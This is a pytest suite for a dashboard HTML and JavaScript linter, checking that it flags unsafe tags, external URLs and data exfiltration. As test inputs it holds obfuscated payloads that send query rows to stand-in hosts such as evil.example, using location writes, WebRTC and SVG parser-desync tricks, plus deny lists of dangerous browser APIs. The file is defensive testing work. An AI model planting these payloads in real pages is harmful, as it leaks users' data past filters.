"""AGENT-02/03 pins for app.dashboardlint, the pure dashboard contract gate.

Assertions go by rule name, never by exact message text."""

import json
import re
import time
from pathlib import Path

import pytest

from app import dashboardlint as dl
from app import dashboards_serve

APP_ROOT = Path(__file__).resolve().parents[2]
CONTRACT = APP_ROOT / "docs" / "DASHBOARD_CONTRACT.md"
SKILL = APP_ROOT / "skills_library" / "intelligence-corner" / "dashboard-authoring" / "SKILL.md"
VENDOR = APP_ROOT / "dashboards" / "vendor.json"

Q = [{"id": "orders", "sql": "SELECT 1 AS n"}]
CLEAN_SCRIPT = (
    "async function data(id) {\n"
    "  const r = await fetch('./data/' + id + location.search, { cache: 'no-store' });\n"
    "  return r.json();\n}\n"
    "data('orders').then(d => { document.title = String(d.rows.length); });\n"
)


def page(body_html="", head_extra="", script=CLEAN_SCRIPT):
    return (
        "<!doctype html>\n<html lang=\"en\"><head>\n<meta charset=\"utf-8\">\n"
        "<title>T</title>\n" + dl.LIB_LINE + "\n" + head_extra + "\n</head><body>\n"
        + body_html + "\n<script>\n" + script + "</script></body></html>\n"
    )


def rules(res, level="errors"):
    return {f["rule"] for f in res[level]}


def _fenced(text, lang):
    m = re.search(r"```" + re.escape(lang) + r"[ \t]*\r?\n(.*?)```", text, re.DOTALL)
    assert m, f"no fenced {lang} block"
    return m.group(1)


# ---------------------------------------------------------------- structure

def test_clean_page_has_no_errors():
    code = page()
    res = dl.lint(code, Q)
    assert res["errors"] == [], res
    assert res["size_bytes"] == len(code.encode("utf-8"))


def test_findings_have_exact_keys():
    res = dl.lint(page("<iframe></iframe>\n<div onclick=\"x()\"></div>"), Q)
    assert res["errors"]
    for f in res["errors"] + res["warnings"]:
        assert set(f) == {"rule", "line", "message"}
        assert f["line"] is None or (isinstance(f["line"], int) and f["line"] > 0)
    assert any(f["line"] for f in res["errors"])


def test_oversize_is_single_size_error():
    code = page() + " " * (262_145 - len(page().encode()))
    assert len(code.encode()) == 262_145
    res = dl.lint(code, Q)
    assert rules(res) == {"size"}
    assert len(res["errors"]) == 1


def test_non_str_code_is_size_finding():
    assert "size" in rules(dl.lint(None, Q))
    assert "size" in rules(dl.lint("   ", Q))


def test_never_raises_on_odd_queries():
    for q in (None, "x", 5, [None], [[1]], {"a": 1}):
        res = dl.lint(page(), q)
        assert "queries" in rules(res)


def test_missing_doctype():
    code = page().replace("<!doctype html>", "<html>", 1)
    assert "doctype" in rules(dl.lint(code, Q))


def test_bom_and_whitespace_before_doctype_ok():
    code = "\ufeff \n" + page().replace("<!doctype html>", "<!DOCTYPE HTML>", 1)
    assert "doctype" not in rules(dl.lint(code, Q))


def test_queries_bad_sql_names_id():
    res = dl.lint(page(), [{"id": "orders", "sql": "UPDATE t SET a = 1"}])
    fs = [f for f in res["errors"] if f["rule"] == "queries"]
    assert fs and "orders" in fs[0]["message"]


def test_queries_each_bad_entry_reported():
    qs = [{"id": "orders", "sql": "DELETE FROM t"}, {"id": "Bad", "sql": "SELECT 1"}]
    res = dl.lint(page(), qs)
    assert len([f for f in res["errors"] if f["rule"] == "queries"]) >= 2
    assert "query_ids" not in rules(res)  # a bad entry does not cascade


def test_queries_too_many_and_non_list_and_duplicate():
    many = [{"id": f"q{i}", "sql": "SELECT 1"} for i in range(21)]
    assert "queries" in rules(dl.lint(page(), many))
    assert "queries" in rules(dl.lint(page(), {"id": "x"}))
    dup = [{"id": "orders", "sql": "SELECT 1"}, {"id": "orders", "sql": "SELECT 2"}]
    assert "queries" in rules(dl.lint(page(), dup))


@pytest.mark.parametrize("head", [
    "<script src=\"https://cdn.example/chart.js\"></script>",
    "<script src=\"" + dl.LIB_SRC + "\" integrity=\"sha256-AAAA\"></script>",
    "<script src=\"" + dl.LIB_SRC + "\" integrity=\"" + dl.LIB_INTEGRITY + "\" crossorigin></script>",
    dl.LIB_LINE,  # a second copy
])
def test_library_rule(head):
    assert "library" in rules(dl.lint(page(head_extra=head), Q))


def test_library_foreign_integrity_reuse():
    head = "<script src=\"https://x.example/a.js\" integrity=\"" + dl.LIB_INTEGRITY + "\"></script>"
    assert "library" in rules(dl.lint(page(head_extra=head), Q))


@pytest.mark.parametrize("frag", [
    "<iframe></iframe>", "<form></form>", "<link rel=\"x\">", "<object></object>",
    "<embed>", "<template></template>", "<blink>x</blink>", "<video></video>",
    "<meta http-equiv=\"refresh\" content=\"0\">", "<input type=\"file\">",
    "<foreignobject></foreignobject>", "<noscript></noscript>",
])
def test_tags_rule(frag):
    assert "tags" in rules(dl.lint(page(frag), Q))


def test_base_is_tags_error():
    assert "tags" in rules(dl.lint(page("<base href=\"/x\">"), Q))


def test_allowed_tags_pass():
    body = ("<section><h1>x</h1><table><tr><td>1</td></tr></table><input type=\"checkbox\">"
            "<button>b</button><a href=\"#top\">t</a><svg xmlns=\"http://www.w3.org/2000/svg\">"
            "<g><path d=\"M0 0\"/></g></svg><canvas id=\"c\"></canvas></section>")
    res = dl.lint(page(body), Q)
    assert res["errors"] == [], res


def test_meta_viewport_ok():
    head = "<meta name=\"viewport\" content=\"width=device-width\">"
    assert dl.lint(page(head_extra=head), Q)["errors"] == []


def test_anchor_external_href():
    r1 = dl.lint(page("<a href=\"#top\">t</a>"), Q)
    assert r1["errors"] == []
    r2 = dl.lint(page("<a href=\"https://x.example\">t</a>"), Q)
    assert {"attrs", "external_url"} <= rules(r2)


@pytest.mark.parametrize("frag", [
    "<div onclick=\"x()\"></div>",
    "<a href=\"java&#x09;script:alert(1)\">x</a>",
    "<a href=\" javascript:alert(1)\">x</a>",
    "<img src=\"/x.png\">",
    "<div formaction=\"x\"></div>",
    "<div srcdoc=\"x\"></div>",
    "<div style=\"background:url(/x.png)\"></div>",
    "<div style=\"width:expression(alert(1))\"></div>",
])
def test_attrs_rule(frag):
    assert "attrs" in rules(dl.lint(page(frag), Q))


def test_img_data_uri_ok():
    res = dl.lint(page("<img src=\"data:image/png;base64,AAAA\">"), Q)
    assert res["errors"] == [], res


def test_style_attr_protocol_relative():
    res = dl.lint(page("<div style=\"background:url(//evil.example/a)\"></div>"), Q)
    assert {"attrs", "external_url"} <= rules(res)


def test_xmlns_exception_only():
    ok = dl.lint(page("<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></svg>"), Q)
    assert "external_url" not in rules(ok)
    bad = dl.lint(page("<p>see http://www.w3.org/2000/svg</p>"), Q)
    assert "external_url" in rules(bad)


def test_external_url_in_js_string_and_ws():
    res = dl.lint(page(script=CLEAN_SCRIPT + "var u = '//evil.example/x';\n"), Q)
    assert "external_url" in rules(res)
    res = dl.lint(page("<p>wss://x</p>"), Q)
    assert "external_url" in rules(res)


@pytest.mark.parametrize("css", [
    "@import 'a.css';", "@font-face{font-family:x}", ".a{background:url(/img.png)}",
])
def test_css_rule(css):
    assert "css" in rules(dl.lint(page(head_extra="<style>" + css + "</style>"), Q))


def test_css_data_url_ok():
    css = ".a{background:url(data:image/png;base64,AA)}"
    res = dl.lint(page(head_extra="<style>" + css + "</style>"), Q)
    assert "css" not in rules(res)


# ---------------------------------------------------------------- scripts

def with_js(snippet):
    return page(script=CLEAN_SCRIPT + snippet + "\n")


def test_canonical_examples_lint_clean():
    t = CONTRACT.read_text(encoding="utf-8")
    res = dl.lint(_fenced(t, "html"), json.loads(_fenced(t, "json")))
    assert res["errors"] == [], res
    # Phase 18: the skill now teaches chart specs; its example is pinned by test_dashboard_skill_lint
    assert not rules(res, "warnings") & {"unused_query", "dynamic_ids"}


def test_clean_page_ids_used():
    assert dl.lint(page(), Q)["ids_used"] == ["orders"]


@pytest.mark.parametrize("snippet", [
    "eval('1')", "var f = new Function('return 1')", "setTimeout('x()', 1000)",
    "document.write('x')", "document.cookie", "el.innerHTML = 'x'", "el.outerHTML = 'x'",
    "el.insertAdjacentHTML('beforeend', 'x')", "localStorage.getItem('a')",
    "sessionStorage.a", "indexedDB.open('a')", "new XMLHttpRequest()", "new WebSocket('x')",
    "new EventSource('x')", "new Worker('x')", "navigator.sendBeacon('x')",
    "import('x')", "window.postMessage('x', '*')", "window.open('x')", "open('x')",
    "top.location", "var a = window.parent", "atob('eA==')", "String.fromCharCode(65)",
    "unescape('%41')", "escape('a')", "x.constructor", "o.__proto__", "Reflect.get(a, 'b')",
    "window['fetch']('x')", "decodeURIComponent('a')", "caches.open('a')",
])
def test_js_dangerous(snippet):
    assert "js_dangerous" in rules(dl.lint(with_js(snippet), Q))


@pytest.mark.parametrize("snippet", [
    "// eval('x') innerHTML localStorage", "/* new WebSocket('x') document.write */",
])
def test_js_comments_refused(snippet):
    # CR-01: comments are refused so the comment stripper can never be desynchronised.
    assert "js_dangerous" in rules(dl.lint(with_js(snippet), Q))


@pytest.mark.parametrize("snippet", [
    "data('orders').then(d=>{const r=/\/\//;location.href='/'+'/evil.example/?d='+JSON.stringify(d.rows);});",
    "document.defaultView.location.href='x'",
    "const w=window; w.location.href='x'",
    "this.location.assign('x')",
    "const a=document.createElement('a'); a.href='/'+'/evil.example'; a.click();",
    "const g=this; const P=g['RTCPeer'+'Connection']; new P({})",
    "const u=`xmlns=\"https://www.w3.org.evil.example/\"`.slice(7,-1);",
])
def test_cr01_exfiltration_payloads_refused(snippet):
    assert dl.lint(with_js(snippet), Q)["errors"], snippet


def test_unhashable_query_id_does_not_raise():
    res = dl.lint(page(), [{"id": ["a"], "sql": "select 1"}])
    assert "queries" in rules(res)


@pytest.mark.parametrize("snippet", [
    "location.href = 'x'", "location.assign('x')", "window.location = 'x'",
    "document.location.replace('x')", "var l = location",
])
def test_location_rule(snippet):
    assert "location" in rules(dl.lint(with_js(snippet), Q))


def test_location_search_and_row_property_ok():
    res = dl.lint(with_js("var q = location.search; var a = [].map(r => r.place);"), Q)
    assert res["errors"] == [], res


@pytest.mark.parametrize("snippet", [
    "fetch('/api/x')", "fetch(url)", "fetch('https://x.example')", "fetch('./data/orders')",
])
def test_fetch_rule(snippet):
    assert "fetch" in rules(dl.lint(with_js(snippet), Q))


def test_fetch_ok():
    res = dl.lint(with_js("fetch('./data/' + id + location.search, {cache: 'no-store'})"), Q)
    assert "fetch" not in rules(res)


def test_undeclared_query_id_literal():
    res = dl.lint(with_js("fetch('./data/ghost' + location.search)"), Q)
    fs = [f for f in res["errors"] if f["rule"] == "query_ids"]
    assert fs and "ghost" in fs[0]["message"]


def test_undeclared_query_id_via_helper():
    res = dl.lint(with_js("data('ghost');"), Q)
    assert any("ghost" in f["message"] for f in res["errors"] if f["rule"] == "query_ids")


def test_arrow_helper_resolved():
    js = ("const get = async (id) => { const r = await fetch('./data/' + id + location.search); return r.json(); };\n"
          "get('orders');")
    res = dl.lint(page(script=js), Q)
    assert res["errors"] == [] and res["ids_used"] == ["orders"]
    assert "dynamic_ids" not in rules(res, "warnings")


def test_unused_query_warning():
    qs = Q + [{"id": "extra", "sql": "SELECT 2 AS n"}]
    assert "unused_query" in rules(dl.lint(page(), qs), "warnings")


def test_dynamic_ids_warning_suppresses_unused():
    js = "async function g(id) { return fetch('./data/' + id + location.search); }\n"
    res = dl.lint(page(script=js), Q)
    assert "dynamic_ids" in rules(res, "warnings")
    assert "unused_query" not in rules(res, "warnings")


def test_refresh_rate_warning():
    assert "refresh_rate" in rules(dl.lint(with_js("setInterval(load, 5000);"), Q), "warnings")
    assert "refresh_rate" not in rules(dl.lint(with_js("setInterval(load, 60000);"), Q), "warnings")


def test_dup_columns_warning():
    qs = [{"id": "orders", "sql": "SELECT c.name, s.name FROM customers c JOIN sales_reps s ON true"}]
    assert "dup_columns" in rules(dl.lint(page(), qs), "warnings")


def test_soft_size_warning():
    code = page("<p>" + "x" * 61_000 + "</p>")
    assert "soft_size" in rules(dl.lint(code, Q), "warnings")


def test_false_positive_fixture_chartjs_idioms():
    js = (
        "const options = {plugins: {legend: {position: 'top'}}, layout: {padding: {top: 8}}};\n"
        "var reopenCount = 0; var s = escapeLabel('x'); var t = 'Top customers';\n"
    )
    res = dl.lint(with_js(js), Q)
    assert res["errors"] == [], res
    assert res["warnings"] == [], res


# Phase 6 gap closure: contract section 6 as an allowlist (globals, computed keys, split literals)
ALIAS_PAYLOADS = [
    "const w=window; w['loc'+'ation']['hr'+'ef']='/'+'/evil.example/?'+d.rows",
    "const D=document; D['loc'+'ation']='/'+'/evil.example/'",
    "const g=globalThis; g['loc'+'ation']='/'+'/evil.example/'",
    "const g=globalThis; const P=g['R'+'TCPeerConnection']; new P({iceServers:[{urls:'stu'+'n:'+d.rows}]})",
    "const f=self; f.fetch('/'+'/evil.example')",
    "const w=(window); w.fetch('x')",
    "const {location} = window",
    "const a=[document][0]",
    "var u='htt'+'ps://evil.example'",
]


@pytest.mark.parametrize("snippet", ALIAS_PAYLOADS)
def test_alias_bypass_payloads_refused(snippet):
    res = dl.lint(with_js(snippet), Q)
    assert res["errors"], snippet


@pytest.mark.parametrize("snippet", ["const w = window;", "const g=globalThis; g.x=1", "var a=[document][0]",
                                     "const {location} = window", "var f = self", "var q = frames"])
def test_global_alias_rule(snippet):
    assert "global_alias" in rules(dl.lint(with_js(snippet), Q))


@pytest.mark.parametrize("snippet,expected", [
    ("var o={}; o['a'+'b']", {"computed_key", "split_literal"}),
    ("var o={}; o['name']", {"computed_key"}),
    ("var o={}; var n=1; o[n + 1]", {"computed_key"}),
    # d.rows.length - 1 is not a plain dotted path: the allowlist refuses arithmetic keys
    ("var d={rows:[]}; var last = d.rows[d.rows.length - 1];", {"computed_key"}),
])
def test_computed_key_rule(snippet, expected):
    assert expected <= rules(dl.lint(with_js(snippet), Q))


@pytest.mark.parametrize("snippet", ["var s = 'a'+'b';", 'var s = "a" + "b";', "var s = `a` +\n`b`;"])
def test_split_literal_rule(snippet):
    assert "split_literal" in rules(dl.lint(with_js(snippet), Q))


@pytest.mark.parametrize("snippet", [
    "var q = location.search; var a = [].map(r => r.place);",
    "chart.data.datasets[0].data = values;",
    "const v = rows[i]; const w = labels[idx]; const z = d.rows[0].day;",
    "document.getElementById('c').textContent = 'x'",
    "var m = 'data ' + id + ': HTTP ' + r.status;",
    "const bucket = new Map(); bucket.set(r.metric, r.value); var arr = [1, 2, 3];",
])
def test_allowlist_no_false_positives(snippet):
    res = dl.lint(with_js(snippet), Q)
    assert res["errors"] == [], res
    new_rules = {"global_alias", "computed_key", "split_literal"}
    assert not (rules(res) | rules(res, "warnings")) & new_rules


def test_performance_250kb():
    rows = "<tr><td>row value</td><td>12345</td></tr>\n" * 6000
    code = page("<table>" + rows + "</table>")
    assert 240_000 < len(code.encode()) <= 262_144
    t0 = time.perf_counter()
    dl.lint(code, Q)
    assert time.perf_counter() - t0 < 1.0


def test_library_constants_parity():
    assert dl.LIB_INTEGRITY in dashboards_serve.LIB_CSP_HASHES
    assert dl.LIB_LINE in CONTRACT.read_text(encoding="utf-8")
    if VENDOR.is_file():
        lib = json.loads(VENDOR.read_text(encoding="utf-8"))["libraries"][0]
        assert dl.LIB_SRC == lib["served_at"]
        entry = next(f for f in lib["files"] if f["path"] == lib["entry"])
        assert dl.LIB_INTEGRITY == entry["csp_hash"]


# ── Phase 12 (AGENT-07): 06-VERIFICATION bypass payloads ──

def _p12_page(inner):
    script = ("fetch('./data/orders' + location.search).then(r => r.json()).then(d => { "
              + inner + " });\n")
    return page('<a id="x" href="#top">x</a><div id="c"></div>', script=script)


_P12_PAYLOADS = {
    "dotted_self_alias_nav": (
        "const w = window.window; const a = 'loc'; const k = a + 'ation'; const s = '/'; "
        "w[k] = s + '/exfil.example.invalid/?n=' + d.rows[0].n;",
        {"self_ref", "computed_write"}),
    "ownerdocument_join_nav": (
        "const D = document.getElementById('c').ownerDocument; const k = ['loc', 'ation'].join(''); "
        "D[k] = ['/', '/exfil.example.invalid/?n=', d.rows[0].n].join('');",
        {"dom_backref", "computed_write", "string_build"}),
    "anchor_dispatch_click": (
        "const el = document.getElementById('x'); const h = 'hr'; const k = h + 'ef'; const s = '/'; "
        "el[k] = s + '/exfil.example.invalid/?n=' + d.rows[0].n; el.dispatchEvent(new MouseEvent('click'));",
        {"dispatch", "computed_write"}),
    "dotted_self_webrtc": (
        "const g = globalThis.globalThis; const r = 'R'; const k = r + 'TCPeerConnection'; const P = g[k]; "
        "const st = 'stu'; new P({iceServers: [{urls: st + 'n:' + d.rows.length + '.evil.example'}]});",
        {"self_ref", "webrtc"}),
    "event_view_nav": (
        "el.addEventListener('mouseover', e => { const w = e.view; const a = 'loc'; const k = a + 'ation'; "
        "const s = '/'; w[k] = s + '/evil.example/'; });",
        {"dom_backref", "computed_write"}),
    "template_literal_key": (
        "const w = self.self; const k = `${a}ation`;",
        {"self_ref", "string_build"}),
    "concat_method": (
        "const D = document.body.ownerDocument; const k = 'loc'.concat('ation');",
        {"dom_backref", "string_build"}),
}


@pytest.mark.parametrize("name", sorted(_P12_PAYLOADS))
def test_p12_payload_refused(name):
    inner, want = _P12_PAYLOADS[name]
    res = dl.lint(_p12_page(inner), Q)
    assert res["errors"], name
    assert want <= rules(res), (name, rules(res))


def test_p12_payload_dotted_self_alias_nav():
    test_p12_payload_refused("dotted_self_alias_nav")


def test_p12_payload_ownerdocument_join_nav():
    test_p12_payload_refused("ownerdocument_join_nav")


def test_p12_payload_anchor_dispatch_click():
    test_p12_payload_refused("anchor_dispatch_click")


def test_p12_payload_dotted_self_webrtc():
    test_p12_payload_refused("dotted_self_webrtc")


def test_p12_payload_event_view_nav():
    test_p12_payload_refused("event_view_nav")


def test_p12_payload_template_literal_key():
    test_p12_payload_refused("template_literal_key")


def test_p12_payload_concat_method():
    test_p12_payload_refused("concat_method")


@pytest.mark.parametrize("snippet,rule", [
    ("const a = window.self.x;", "self_ref"),
    ("const a = window.window;", "self_ref"),
    ("const a = x.top; const b = y.parent; const c = z.frames;", "self_ref"),
    ("const a = window.document;", "self_ref"),
    ("const a = node.parentNode;", "dom_backref"),
    ("const a = n.getRootNode();", "dom_backref"),
    ("const a = e.composedPath();", "dom_backref"),
    ("const a = f.contentWindow; const b = f.contentDocument;", "dom_backref"),
    ("const a = e.view;", "dom_backref"),
    ("const a = x.defaultView;", "dom_backref"),
    ("x.dispatchEvent(e);", "dispatch"),
    ("m[key] = 1;", "computed_write"),
    ("m['a'] += 1;", "computed_write"),
    ("m[k] ??= 0;", "computed_write"),
    ("m[k] ||= 0;", "computed_write"),
    ("const a = `a${b}`;", "string_build"),
    ("const a = 'a'.concat(b);", "string_build"),
    ("const a = ['a', b].join('');", "string_build"),
    ("u.hostname = h;", "location_parts"),
    ("u.hash = h;", "location_parts"),
    ("u.protocol = 'x';", "location_parts"),
    ("const P = new FooPeerConnection();", "webrtc"),
    ("const P = 'TCPeerConnection';", "webrtc"),
    ("const P = x.createDataChannel;", "webrtc"),
    ("const P = new X.IceCandidate();", "webrtc"),
    ("const u = 'turn:127.0.0.1:3478';", "webrtc"),
    ('const u = "STUN:stun.example";', "webrtc"),
    ("const u = `turns:host`;", "webrtc"),
])
def test_p12_rule_positives(snippet, rule):
    res = dl.lint(with_js(snippet), Q)
    assert rule in rules(res), (snippet, res["errors"])


@pytest.mark.parametrize("snippet", [
    "rows[0] = 1;",
    "chart.data.datasets[0].data = values;",
    "if (a[i] === b) { x = 1; }",
    "if (a[k] == b) { x = 1; }",
    "const t = rows.map(r => r.name).join(', ');",
    "const t = `plain text`;",
    "const c = document.getElementById('c');",
    "chart.update();",
    "const n = el.view_count;",
    "const o = { plugins: { legend: { display: false } } };",
    "const a = 'Returns: ' + n;",
    'const b = "Sales return: " + v;',
    "const c = 'Net returns:';",
    "const d = { label: 'Turnover: ' + t };",
    "a[i].v = 1;",
])
def test_p12_rule_negatives(snippet):
    res = dl.lint(with_js(snippet), Q)
    new = {"self_ref", "dom_backref", "dispatch", "computed_write", "string_build",
           "location_parts", "webrtc"}
    assert not rules(res) & new, (snippet, res["errors"])
    assert res["errors"] == [], (snippet, res["errors"])


def test_p12_rules_registered():
    for r in ("self_ref", "dom_backref", "dispatch", "computed_write", "string_build",
              "location_parts", "webrtc"):
        assert r in dl.ERROR_RULES


# Phase 12 review CR-01: comment-parser differential must not hide markup.
@pytest.mark.parametrize("frag", [
    '<!--> <link rel="preconnect" href="//h.example"> -->',
    '<!-- x --><div></div>',
    '<![CDATA[ x ]]>',
    '<?php x ?>',
])
def test_html_comment_refused(frag):
    assert "html_comment" in rules(dl.lint(page(body_html=frag), []))


# ── Phase 12 gap closure (12-VERIFICATION gap 1): parser differentials ──
def test_p12_gap_verifier_svg_style_payload():
    frag = '<svg><style></svg><link rel="preconnect" href="//h.example"></style>'
    r = rules(dl.lint(page(body_html=frag), []))
    assert {"foreign_raw_text", "resource_hint"} <= r


@pytest.mark.parametrize("frag", [
    '<svg><title></svg><link rel=preconnect href=//h.example></title>',
    '<svg><script></svg><p>x</p></script>',
    '<svg><g><textarea></svg><img src="//h.example/p"></textarea></g>',
    '<svg width="10"><style>rect{fill:red}</style></svg>',
    '<math><style></math><meta http-equiv="refresh" content="0;url=//h.example"></style>',
    '<SVG><STYLE></SVG><a href="#x">x</a></STYLE>',
])
def test_p12_gap_foreign_raw_text(frag):
    assert "foreign_raw_text" in rules(dl.lint(page(body_html=frag), []))


@pytest.mark.parametrize("kw", [
    {"head_extra": '<link rel="modulepreload" href="#m">'},
    {"head_extra": '<LiNk rel=stylesheet href=#s>'},
    {"body_html": '<svg><style></svg><LINK REL=DNS-PREFETCH HREF=//h.example></style>'},
    {"script": CLEAN_SCRIPT + "const r = 'prerender';\n"},
    {"script": CLEAN_SCRIPT + "const k = 'preconnect';\n"},
])
def test_p12_gap_resource_hint(kw):
    assert "resource_hint" in rules(dl.lint(page(**kw), []))


def test_p12_gap_style_markup():
    res = dl.lint(page(head_extra='<style>.a{color:red} <meta http-equiv=refresh content="0;url=#x"></style>'), [])
    assert "style_markup" in rules(res)


def test_p12_gap_protocol_relative_attr():
    res = dl.lint(page(body_html='<svg><style></svg><a href=//h.example/x>x</a></style>'), [])
    assert "external_url" in rules(res)


@pytest.mark.parametrize("kw", [
    {"body_html": '<svg viewBox="0 0 100 20" role="img" aria-label="Sales"><rect width="40" height="10"/>'
                  '<path d="M0 0L5 5"/><text x="1" y="18">Sales: 5</text></svg>'},
    {"body_html": '<svg/><p>Linked accounts: 4</p>'},
    {"head_extra": '<style>.a > .b{content:"<"}</style>'},
    {"script": CLEAN_SCRIPT + "const L = { label: 'Prefetched orders' };\n"},
    {"script": CLEAN_SCRIPT + "const M = { label: 'Links per rep' };\n"},
    {},
])
def test_p12_gap_negatives(kw):
    res = dl.lint(page(**kw), [])
    assert not rules(res) & {"foreign_raw_text", "resource_hint", "style_markup", "external_url"}, res["errors"]


def test_p12_gap_rules_registered():
    for r in ("foreign_raw_text", "resource_hint", "style_markup"):
        assert r in dl.ERROR_RULES


# ── AGENT-07 hidden-markup fix: the linter reads the spec parser's tree, not a tag counter ──
from app import dashboardhtml  # noqa: E402

_REFRESH = r'<meta http-equiv="refresh" content="0;url=/\h.example/x">'
_OPEN_QUOTED = '<svg><g data-x="</svg>">'     # (a) a quoted closing tag
_OPEN_UNQUOTED = "<svg data-x=a/>"             # (b) an unquoted value ending in '/'

# 12-VERIFICATION gap 1: two ways to desynchronise the old svg depth counter, times two
# carriers (SVG <title>, SVG <script>) for a meta refresh with a backslash-form target.
AGENT07_VARIANTS = {
    "quoted_close_title": _OPEN_QUOTED + "<title>" + _REFRESH + "</title></g></svg>",
    "quoted_close_script": _OPEN_QUOTED + "<script>" + _REFRESH + "</script></g></svg>",
    "unquoted_slash_title": _OPEN_UNQUOTED + "<title>" + _REFRESH + "</title></svg>",
    "unquoted_slash_script": _OPEN_UNQUOTED + "<script>" + _REFRESH + "</script></svg>",
}


@pytest.mark.parametrize("name", sorted(AGENT07_VARIANTS))
def test_agent07_verifier_variants_refused(name):
    r = rules(dl.lint(page(body_html=AGENT07_VARIANTS[name]), Q))
    assert {"http_equiv", "foreign_raw_text", "external_url"} <= r, (name, r)


@pytest.mark.parametrize("name", sorted(AGENT07_VARIANTS))
def test_agent07_tree_sees_the_hidden_element(name):
    # Independent of the text rules: the parsed tree itself holds the svg carrier.
    canon = dashboardhtml.canonicalize(page(body_html=AGENT07_VARIANTS[name]))
    assert canon.stable
    carriers = [e for e in canon.elements if e.ns == dashboardhtml.SVG_NS
                and e.name in ("title", "script")]
    assert carriers, name


@pytest.mark.parametrize("frag", [
    _OPEN_QUOTED + "<title>x</title></g></svg>",
    _OPEN_UNQUOTED + "<title>x</title></svg>",
    _OPEN_QUOTED + "<style>rect{fill:red}</style></g></svg>",
    _OPEN_UNQUOTED + "<script>1</script></svg>",
    "<svg><g data-x='</svg>'><title>x</title></g></svg>",
    "<svg viewBox=0/><g><title>x</title></g></svg>",
])
def test_agent07_depth_desync_no_longer_hides_foreign_raw_text(frag):
    assert "foreign_raw_text" in rules(dl.lint(page(body_html=frag), Q))


@pytest.mark.parametrize("carrier", ["title", "script", "desc", "foreignObject"])
def test_agent07_svg_carriers_refused(carrier):
    frag = f"<svg><{carrier}><p>x</p></{carrier}></svg>"
    assert rules(dl.lint(page(body_html=frag), Q)) & {"foreign_raw_text", "tags"}


def test_agent07_html_inside_svg_integration_point_refused():
    canon = dashboardhtml.canonicalize(page(body_html="<svg><desc><b>x</b></desc></svg>"))
    b = [e for e in canon.elements if e.name == "b"]
    assert b and b[0].ns == dashboardhtml.HTML_NS
    assert "tags" in rules(dl.lint(page(body_html="<svg><desc><b>x</b></desc></svg>"), Q))


@pytest.mark.parametrize("kw", [
    {"body_html": '<p data-x="http-equiv">x</p>'},
    {"body_html": "<p>HTTP-EQUIV</p>"},
    {"script": CLEAN_SCRIPT + "const k = 'http-equiv';\n"},
    {"body_html": "<p>http&#45;equiv</p>"},
])
def test_agent07_http_equiv_text_anywhere(kw):
    assert "http_equiv" in rules(dl.lint(page(**kw), Q))


@pytest.mark.parametrize("kw", [
    {"body_html": r'<a href="/\h.example/x">x</a>'},
    {"body_html": r'<div data-u="\\h.example">x</div>'},
    {"body_html": r"<div data-u='\/h.example'>x</div>"},
    {"body_html": r"<div data-u=/\h.example>x</div>"},
    {"body_html": '<div data-u="/&#92;h.example">x</div>'},
    {"body_html": '<div data-u="/&#9;/h.example">x</div>'},
    {"body_html": r'<div style="background:url(/\h.example/a)">x</div>'},
    {"body_html": r'<svg><rect fill="url(\/h.example/p#g)"/></svg>'},
    {"head_extra": r'<style>.a{background:url("\/h.example/a")}</style>'},
    {"head_extra": r'<style>.a{background:image-set("/\h.example/a" 1x)}</style>'},
    {"script": CLEAN_SCRIPT + "var u = '/\\\\h.example/x';\n"},
    {"script": CLEAN_SCRIPT + "var u = '\\/\\/h.example/x';\n"},
    {"script": CLEAN_SCRIPT + "var u = \"\\\\\\\\h.example\";\n"},
    {"script": CLEAN_SCRIPT + "var u = '\\x2f\\x2fh.example';\n"},
    {"script": CLEAN_SCRIPT + "var u = ' \\u002f/h.example';\n"},
])
def test_agent07_backslash_protocol_relative(kw):
    assert "external_url" in rules(dl.lint(page(**kw), Q)), kw


@pytest.mark.parametrize("snippet", [
    "const re = /\\s+/g; const t = 'a b'.replace(re, ' ');",
    "const n = String(1234567).replace(/\\B(?=(\\d{3})+(?!\\d))/g, ',');",
    "const p = 'a/b'.split('/'); const q = 'C:' + '';",
    "const m = 'x'.match(/\\//);",
])
def test_agent07_no_false_positive_on_js_regex(snippet):
    res = dl.lint(with_js(snippet), Q)
    assert "external_url" not in rules(res), res["errors"]


def test_agent07_chart_svg_still_clean():
    body = ('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" '
            'viewBox="0 0 100 40" role="img" aria-label="Sales"><defs><linearGradient id="g">'
            '<stop offset="0" stop-color="#D4952B"/></linearGradient><clipPath id="k">'
            '<rect width="100" height="40"/></clipPath></defs><g clip-path="url(#k)">'
            '<rect id="r" width="40" height="10" fill="url(#g)"/><use href="#r" y="12"/>'
            '<use xlink:href="#r" y="24"/><polyline points="0,0 5,5"/><circle r="2"/>'
            '<text x="1" y="38"><tspan>Sales: 5</tspan></text></g></svg>')
    res = dl.lint(page(body), Q)
    assert res["errors"] == [], res["errors"]


def test_agent07_parser_differential_when_canonical_form_unstable(monkeypatch):
    real = dashboardhtml.canonicalize

    def unstable(text):
        c = real(text)
        c.stable = False
        return c
    monkeypatch.setattr(dashboardhtml, "canonicalize", unstable)
    assert "parser_differential" in rules(dl.lint(page(), Q))


def test_agent07_script_parity_with_save_time_hashes(monkeypatch):
    monkeypatch.setattr(dl.dashboards, "inline_script_hashes", lambda text: frozenset())
    assert "parser_differential" in rules(dl.lint(page(), Q))


def test_agent07_rules_registered():
    for r in ("http_equiv", "parser_differential", "foreign_raw_text"):
        assert r in dl.ERROR_RULES


def test_agent07_canonical_examples_are_fixpoints():
    for text in (_fenced(CONTRACT.read_text(encoding="utf-8"), "html"),
                 page()):  # Phase 18: the skill no longer carries an HTML example
        canon = dashboardhtml.canonicalize(text)
        assert canon.stable and canon.has_doctype
        assert dashboardhtml.canonicalize(canon.html).html == canon.html
